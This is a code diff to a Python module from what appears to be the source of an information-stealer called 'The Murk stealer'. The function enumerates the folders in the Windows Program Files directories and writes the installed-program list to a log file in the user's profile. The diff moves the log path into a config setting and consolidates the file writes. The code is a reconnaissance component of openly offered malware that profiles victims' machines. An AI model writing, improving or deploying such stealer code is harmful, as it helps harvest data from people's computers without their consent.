@@ -10,33 +10,28 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import environ,sep,listdir
+from os import environ,listdir
 from manager.logger import Log
-
-path = r"C:\Program Files (x86)"
-path1 = r"C:\Program Files"
+from preferences.config import config
 
 def Programs():
+    path = r"C:\Program Files (x86)"
+    path1 = r"C:\Program Files"
+    user = environ['USERPROFILE']
+    pathToLogs = f'{user}\\{config.pathToLogs}\\System\\Programs.txt'
     try:
-        pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
         dirs = listdir(path)
-        with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
-             prog.write(path+"\n")
+        with open(pathToLogs, "a", encoding="utf-8") as prog:
+            prog.write(path+"\n")
+            for programs in dirs:
+                prog.write(programs+"\n")
         prog.close()
-        for programs in dirs:
-                with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
-                    prog.write(programs+"\n")
-        prog.close()
-
-
 
         dirs = listdir(path1)
-        with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
-             prog.write(path1+"\n")
-        prog.close()
-        for programs in dirs:
-                with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
-                    prog.write(programs+"\n")
+        with open(pathToLogs, "a", encoding="utf-8") as prog:
+            prog.write(path1+"\n")
+            for programs in dirs:
+                prog.write(programs+"\n")
         prog.close()
     except Exception as e:
         Log(f"Programs ---> {e}")
